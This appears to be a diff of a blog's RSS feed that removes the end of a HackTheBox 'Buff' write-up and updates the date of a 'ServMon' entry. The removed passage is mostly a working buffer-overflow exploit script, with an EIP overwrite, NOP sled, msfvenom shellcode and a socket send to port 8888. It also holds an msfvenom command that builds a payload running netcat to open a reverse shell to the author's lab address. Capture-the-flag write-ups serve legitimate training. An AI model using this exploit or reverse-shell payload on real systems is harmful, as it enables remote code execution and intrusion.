-</span></span><span class="line"><span class="cl"><span class="n">EIP</span>        <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
-</span></span><span class="line"><span class="cl"><span class="n">NOPS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">overrun</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
-</span></span></code></pre></div><p>To generate a new payload/shell code, I&rsquo;ll be using <code>msfvenom</code>. But, instead of running <code>calc.exe</code>, I&rsquo;ll change it to execute the netcat I&rsquo;ve uploaded before (during upgrading shell).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ msfvenom -p windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 9005&#39;</span> -b <span class="s1">&#39;\x00\x0A\x0D&#39;</span> -f python -v payload
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa4\x95\xf5\x68\xf4\xe0\x05&#34;</span>
-</span></span></code></pre></div><p>After removed the comments and changed the payload, the <code>bofexploit.py</code> now look like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">padding1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
-</span></span><span class="line"><span class="cl"><span class="n">EIP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
-</span></span><span class="line"><span class="cl"><span class="n">NOPS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa4\x95\xf5\x68\xf4\xe0\x05</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">overrun</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="err">—</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
-</span></span></code></pre></div><p>The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
-</span></span><span class="line"><span class="cl">$ python2 bofexploit.py
-</span></span></code></pre></div><p>On my listener:</p>
-<img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" />
-<p>Now I can grab the root flag or dump the hashes.</p>
-]]></content:encoded>
-    </item>
-    
-    <item>
       <title>HackTheBox - ServMon</title>
       <link>https://fahmifj.github.io/hackthebox/servmon/</link>
-      <pubDate>Fri, 19 Jun 2020 21:12:21 +0000</pubDate>
+      <pubDate>Tue, 06 Apr 2021 23:09:46 +0700</pubDate>
       
       <guid>https://fahmifj.github.io/hackthebox/servmon/</guid>
       <description>Exploiting embedded system software</description>
